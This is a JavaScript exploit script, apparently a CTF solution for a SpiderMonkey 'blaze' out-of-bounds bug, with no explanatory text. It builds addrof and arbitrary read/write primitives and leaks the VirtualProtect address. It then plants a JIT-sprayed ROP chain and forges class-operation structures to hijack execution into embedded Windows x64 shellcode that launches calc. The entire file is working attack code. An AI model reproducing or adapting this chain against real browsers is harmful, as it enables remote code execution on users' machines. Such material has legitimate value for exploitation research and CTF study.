load("../exp-tools/utils.js")
load("../exp-tools/int64.js")

const shellcode = new Uint8Array([
    0x90,
    0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x08, 0x48, 0x8b, 0xec, 0x48, 0x8d, 0x64, 0x24, 0xe8,
    0x48, 0x8d, 0x05, 0x6b, 0x02, 0x00, 0x00, 0x48, 0x89, 0x45, 0xe8, 0x6a, 0x00, 0x8f, 0x45, 0xf0,
    0x48, 0x8d, 0x05, 0x6b, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x08, 0x48, 0x8d, 0x55, 0xe8, 0xe8, 0x74,
    0x01, 0x00, 0x00, 0xe8, 0xd0, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x64, 0x24, 0xe0, 0x48, 0x8d, 0x15,
    0x3e, 0x02, 0x00, 0x00, 0xff, 0x52, 0x08, 0x48, 0x83, 0xc4, 0x20, 0x53, 0x56, 0x57, 0x41, 0x54,
    0x55, 0x48, 0x8b, 0xec, 0x6a, 0x60, 0x58, 0x65, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48,
    0x8b, 0x70, 0x10, 0x48, 0x8b, 0x46, 0x30, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x13, 0xeb, 0x08, 0x4c,
    0x8b, 0x06, 0x49, 0x8b, 0xf0, 0xeb, 0xec, 0x45, 0x33, 0xdb, 0x66, 0x45, 0x33, 0xd2, 0xeb, 0x09,
    0x33, 0xc0, 0xc9, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0x66, 0x8b, 0x46, 0x58, 0x66, 0x44, 0x3b,
    0xd0, 0x72, 0x11, 0xeb, 0x3c, 0x66, 0x45, 0x8b, 0xc2, 0x66, 0x41, 0x83, 0xc0, 0x02, 0x66, 0x45,
    0x8b, 0xd0, 0xeb, 0xe5, 0x45, 0x8b, 0xcb, 0x41, 0xc1, 0xe9, 0x0d, 0x41, 0x8b, 0xc3, 0xc1, 0xe0,
    0x13, 0x44, 0x0b, 0xc8, 0x41, 0x8b, 0xc1, 0x4c, 0x8b, 0x46, 0x60, 0x45, 0x0f, 0xb7, 0xca, 0x4d,
    0x03, 0xc1, 0x45, 0x8a, 0x00, 0x45, 0x0f, 0xbe, 0xc0, 0x41, 0x83, 0xf8, 0x61, 0x72, 0x15, 0xeb,
    0x07, 0x41, 0x3b, 0xcb, 0x74, 0x16, 0xeb, 0x97, 0x41, 0x83, 0xe8, 0x20, 0x41, 0x03, 0xc0, 0x44,
    0x8b, 0xd8, 0xeb, 0xb1, 0x41, 0x03, 0xc0, 0x44, 0x8b, 0xd8, 0xeb, 0xa9, 0x4c, 0x8b, 0x56, 0x30,
    0x41, 0x8b, 0x42, 0x3c, 0x4d, 0x8b, 0xe2, 0x4c, 0x03, 0xe0, 0x41, 0x8b, 0x84, 0x24, 0x88, 0x00,
    0x00, 0x00, 0x4d, 0x8b, 0xca, 0x4c, 0x03, 0xc8, 0x45, 0x33, 0xdb, 0x41, 0x8b, 0x41, 0x18, 0x44,
    0x3b, 0xd8, 0x72, 0x0b, 0xe9, 0x56, 0xff, 0xff, 0xff, 0x41, 0x83, 0xc3, 0x01, 0xeb, 0xec, 0x41,
    0x8b, 0x41, 0x20, 0x49, 0x8b, 0xda, 0x48, 0x03, 0xd8, 0x45, 0x8b, 0xc3, 0x48, 0x8b, 0xc3, 0x4a,
    0x8d, 0x04, 0x80, 0x8b, 0x00, 0x49, 0x8b, 0xfa, 0x48, 0x03, 0xf8, 0x33, 0xc0, 0x48, 0x8b, 0xdf,
    0x48, 0x83, 0xc7, 0x01, 0x44, 0x8a, 0x03, 0x41, 0x0f, 0xbe, 0xd8, 0x83, 0xfb, 0x00, 0x74, 0x02,
    0xeb, 0x06, 0x3b, 0xd0, 0x74, 0x17, 0xeb, 0xc1, 0x44, 0x8b, 0xc0, 0x41, 0xc1, 0xe8, 0x0d, 0xc1,
    0xe0, 0x13, 0x44, 0x0b, 0xc0, 0x44, 0x03, 0xc3, 0x41, 0x8b, 0xc0, 0xeb, 0xd0, 0x41, 0x8b, 0x41,
    0x1c, 0x49, 0x8b, 0xd2, 0x48, 0x03, 0xd0, 0x41, 0x8b, 0x41, 0x24, 0x4d, 0x8b, 0xca, 0x4c, 0x03,
    0xc8, 0x45, 0x8b, 0xc3, 0x49, 0x8b, 0xc1, 0x4a, 0x8d, 0x04, 0x40, 0x66, 0x8b, 0x00, 0x0f, 0xb7,
    0xc8, 0x48, 0x8b, 0xc2, 0x48, 0x8d, 0x04, 0x88, 0x8b, 0x00, 0x4c, 0x03, 0xd0, 0x49, 0x8b, 0xc2,
    0xc9, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0x53, 0x56, 0x57, 0x41, 0x54, 0x55, 0x48, 0x8b, 0xec,
    0x48, 0x8b, 0xf1, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0x03, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x0e, 0x48,
    0x8b, 0xc6, 0x48, 0x83, 0xc6, 0x04, 0x44, 0x8b, 0x20, 0x33, 0xff, 0xeb, 0x07, 0xc9, 0x41, 0x5c,
    0x5f, 0x5e, 0x5b, 0xc3, 0x8b, 0x06, 0x41, 0x8b, 0xcc, 0x8b, 0xd0, 0xe8, 0x6b, 0xfe, 0xff, 0xff,
    0x48, 0x8b, 0xd0, 0x48, 0x83, 0xfa, 0x00, 0x74, 0x02, 0xeb, 0x06, 0x48, 0x83, 0xc3, 0x08, 0xeb,
    0xc5, 0x48, 0x8b, 0x03, 0x48, 0x8b, 0xcf, 0x48, 0x83, 0xc7, 0x01, 0x48, 0x8d, 0x04, 0xc8, 0x48,
    0x89, 0x10, 0x48, 0x83, 0xc6, 0x04, 0xeb, 0xcc, 0x57, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x8d, 0xa4,
    0x24, 0x78, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xbd, 0x78, 0xff, 0xff, 0xff, 0x32, 0xc0, 0x6a, 0x68,
    0x59, 0xf3, 0xaa, 0xc7, 0x85, 0x78, 0xff, 0xff, 0xff, 0x68, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x05,
    0x6e, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x10, 0x4c, 0x8d, 0x95, 0x78, 0xff, 0xff, 0xff, 0x48, 0x8d,
    0x45, 0xe0, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x45, 0x33, 0xc9, 0x50, 0x41, 0x52, 0x6a, 0x00, 0x6a,
    0x00, 0x6a, 0x00, 0x6a, 0x00, 0x48, 0x8d, 0x64, 0x24, 0xe0, 0x48, 0x8d, 0x05, 0x21, 0x00, 0x00,
    0x00, 0xff, 0x10, 0x48, 0x83, 0xc4, 0x50, 0xb9, 0x39, 0x05, 0x00, 0x00, 0x48, 0x8d, 0x64, 0x24,
    0xe0, 0x48, 0x8d, 0x15, 0x0a, 0x00, 0x00, 0x00, 0xff, 0x52, 0x08, 0x48, 0x83, 0xc4, 0x20, 0xc9,
    0x5f, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x17, 0xca, 0x2b, 0x6e, 0x72, 0xfe, 0xb3, 0x16, 0x7e, 0xd8, 0xe2, 0x73, 0x00, 0x00,
    0x00, 0x00, 0x63, 0x61, 0x6c, 0x63, 0x00
]);

let arr = new Array(0x1, 0x2, 0x3, 0x4, 0x5, 0x6);
let addr_index = 13;
let js_addr_index = 9;
let rw_type_arr = new Uint8Array(8);

arr.blaze() == undefined;
let old_addr = arr[addr_index];
let leak_js_addr = arr[js_addr_index];

print("[+] arr addr: " + addrof(arr));
print("[+] rw_type_arr addr: " + addrof(rw_type_arr));
readline();

let sc_u8 = new Float64Array(0x90);
let sc_u8_addr = addrof(sc_u8);
print("[+] sc_u8 addr is: " + sc_u8_addr);

run_your_shellcode( prepare_run_sc());

function read_qword(addr){
    /*  [+] init */
    addr = new Int64(addr);

    arr[addr_index] = addr.asDouble();
    return Int64.fromJSValue(rw_type_arr.slice(0, 8));   
}

function write_qword(addr, value){
    /*  [+] init */
    addr = new Int64(addr);
    value = new Int64(value);

    arr[addr_index] = addr.asDouble();
    rw_type_arr.set(value.bytes()); /*  [+] here we want to write qword */
}

function addrof(obj){
    arr[addr_index + 1] = obj;
    arr[addr_index] = old_addr;
    let res = rw_type_arr.slice(0, 8);
    return Int64.fromJSValue(res);
}

function leak_vp_function_addr(){
    leak_js_addr = Int64.fromDouble(leak_js_addr);
    let js_base = Sub(leak_js_addr, 0x014fd2e8);
    print("[+] js_base: " + js_base);
    let vp_addr = read_qword(Add(js_base, 0x190d270))
    print("[+] vp_addr: " + vp_addr);
    return vp_addr;
}

function build_rop_chain(){
    const D = 2.487982602987859e-275;
    const A = 2.487982018260472e-275;
    const B = 2.4878608212525747e-275;
    const C = -6.380930795567661e-228;
}

function prepare_run_sc(){
    /*  [+] here we should contrustc our rop chain */
    let vp_addr = leak_vp_function_addr();  /*  [+] we got the virtualProtect function address */

    /*  [+] Now we want to control rcx, rdx, r8, r9 */
    for(let i = 0; i < 12; i++){
        build_rop_chain();
    }

    let func_addr = addrof(build_rop_chain);
    let jit_info = Add(func_addr, 0x30);
    let jit_addr = read_qword(jit_info);
    let code_addr = read_qword(jit_addr);
    let rop_chain_addr = Add(code_addr, 0x97b);
    
    print("[+] build_rop_chain_func addr: " + func_addr);
    print("[+] code_addr: " + code_addr);
    print("[+] rop chain at here: " + rop_chain_addr);

    /*  [+] shellcode addr */
    let sc_arr_addr = new Int64(addrof(shellcode));
    let sc_addr = read_qword(Add(sc_arr_addr, 0x38));
    print("[+] ac_arr_addr: " + sc_arr_addr);
    print("[+] shellcode 's addr: " + sc_addr);
    /*  [+] Now we need to make rsp to be our rop chain */
    sc_u8[0] = sc_addr.asDouble();
    sc_u8[1] = new Int64("1000").asDouble();
    sc_u8[2] = new Int64("40").asDouble();
    sc_u8[3] = sc_arr_addr.asDouble();
    sc_u8[4] = vp_addr.asDouble();
    sc_u8[5] = sc_addr.asDouble();
    return rop_chain_addr;
}


function run_your_shellcode(rop_addr){

    /*  [+] The group's address*/
    let sc_u8_group_addr = read_qword(sc_u8_addr);
    print("[+] group addr is: " + sc_u8_group_addr);

    let sc_u8_group_clasp_addr = read_qword(sc_u8_group_addr);
    print("[+] group's clasp addr is: " + sc_u8_group_clasp_addr);

    /*  [+] copy the content of clasp*/
    let fake_clasp = new Array(6);

    for(let i = 0; i < 0x6; i++){
        let value = read_qword(Add(sc_u8_group_clasp_addr, 0x8 * i));
        fake_clasp[i] = value.asDouble();
    }

    /*
    *   [+] Now we got the clasp's memory
    *   [+] We could calculate the fake_clasp's elements
    */
    let fake_clasp_arr_addr  = new Int64(addrof(fake_clasp));
    print("[+] fake_clasp_arr_addr is: " + fake_clasp_arr_addr);

    let fake_clasp_addr = read_qword( Add(fake_clasp_arr_addr, 0x18));

    print("[+] fake_clasp_addr is: " + fake_clasp_addr);

    let test_addr = rop_addr;
    //let test_addr = new Int64("4141414141414141");
    /*  [+] Now we could change the pointer and run our shellcode*/
    write_qword(Add(sc_u8_group_addr, 0x0), fake_clasp_addr);

    let fake_cops = [test_addr.asDouble()];
    let fake_cops_addr = addrof(fake_cops);
    print("[+] fake_cops_addr is: " + fake_cops_addr);

    let fake_cops_arr_ele = read_qword(Add(fake_cops_addr, 0x18));
    print("[+] fake_cops_addr_ele is: " + fake_cops_arr_ele );

    fake_clasp[2] = fake_cops_arr_ele.asDouble();

    /*  [+] Now we need to recover shape->base-clasp
    *   [+] otherwise it will trigger a assert like this
    *   [+] Assertion failure: shape->getObjectClass() == getClass(), at c:\Users\over\mozilla-central\js\src\vm/NativeObject-inl.h:659
    *   
    */
    
    let shape_addr = read_qword(Add(sc_u8_addr, 0x8));
    let sc_shape_base_addr = read_qword(Add(shape_addr, 0x0));

    print("[+] sc shape addr: " + shape_addr);
    print("[+] sc shape 's base addr: " + sc_shape_base_addr);

    write_qword(Add(sc_shape_base_addr, 0x0), fake_clasp_addr);
    sc_u8.fuck = 1;
}


